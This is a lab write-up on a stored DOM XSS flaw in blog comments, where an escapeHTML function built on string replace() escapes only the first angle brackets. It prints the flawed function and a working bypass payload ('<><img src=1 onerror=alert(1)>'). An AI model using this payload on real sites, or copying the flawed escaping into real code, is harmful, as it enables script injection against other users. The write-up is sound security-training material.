# Lab: Stored DOM XSS

**Difficulty:** Practitioner  
**Category:** DOM XSS, Stored DOM XSS


## Vulnerability Summary

This lab demonstrates a **Stored DOM XSS** vulnerability in the blog comment functionality.

User input is stored on the server, returned as JSON, and rendered on the client side using JavaScript.

The application attempts to sanitize HTML using the JavaScript `replace()` function. However, because `replace()` is called with a string instead of a global regular expression, **only the first occurrence** of `<` and `>` is replaced, making the filter ineffective.

<img width="1917" height="1027" alt="1" src="https://github.com/user-attachments/assets/374043d7-ed44-426b-bb01-cc199b8ea21a" />


## Source

Comments are retrieved through an AJAX request:

```javascript
xhr.open("GET", postCommentPath + window.location.search);
```

The response is parsed as JSON:

```javascript
let comments = JSON.parse(this.responseText);
```

User-controlled fields (`author`, `body`, `website`, etc.) are then passed to the rendering function.


## Sink

The comment body is inserted into the DOM using:

```javascript
commentBodyPElement.innerHTML = escapeHTML(comment.body);
```


## Code Analysis

The application sanitizes HTML using the following function:

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;')
               .replace('>', '&gt;');
}
```

At first glance, this looks like a valid HTML escaping function.

However, the problem is the use of:

```javascript
replace("<", "&lt;")
```

When the first argument of `replace()` is a **string**, JavaScript replaces **only the first occurrence**.

Example:

```javascript
"<><img>".replace("<", "&lt;")
```

Result:

```html
&lt;><img>
```

Only the first `<` is escaped.

The same happens with `>`.

After both replacements, the browser receives:

```html
&lt;&gt;<img src=1 onerror=...>
```

The first characters are rendered as plain text:

```
<>
```

while the `<img>` element remains valid HTML.


## Exploitation

Payload:

```html
<><img src=1 onerror=alert(1)>
```

<img width="1916" height="977" alt="3" src="https://github.com/user-attachments/assets/128ab2a0-e99c-459a-a540-acdfa1c5a38e" />


### Why does it work?

The first pair of angle brackets:

```html
<>
```

consumes the only replacement performed by `replace()`.

Every subsequent `<` and `>` remains untouched.

As a result, the browser creates a real HTML element:

```html
<img src=1 onerror=alert(1)>
```

The image fails to load, automatically triggering the `onerror` event and executing JavaScript.


## Impact

An attacker can store a malicious comment.

Every user viewing the page will automatically execute attacker-controlled JavaScript in their browser.


## Where I Got Stuck

Initially, I focused on the DOM data flow:

- `loadComments()`
- `JSON.parse()`
- `displayComments()`
- `innerHTML`

I assumed the vulnerability was related to one of the JSON fields (`website`, `body`, or `author`).

In reality, the issue was much simpler—the HTML sanitization function itself was flawed.


## Wrong Assumptions

- I expected a complex DOM XSS involving `innerHTML`.
- I spent time analyzing individual JSON fields instead of the sanitization logic.
- I underestimated the importance of the `replace()` implementation.


## Key Insight

The existence of an escaping function does **not** mean the application is secure.

When reviewing client-side code, always verify:

- whether **all** occurrences are replaced;
- whether a global regular expression (`/g`) is used;
- whether only the first occurrence is sanitized.


## Lessons Learned

- Never trust a sanitization function without reviewing its implementation.
- `replace()` with a string replaces **only the first occurrence**.
- If your payload is only partially modified, investigate **what** changed and **what remained untouched**.
- Before searching for advanced bypasses, always examine the sanitization logic.
- If part of your payload disappears during testing, treat it as valuable information about how the filter works.
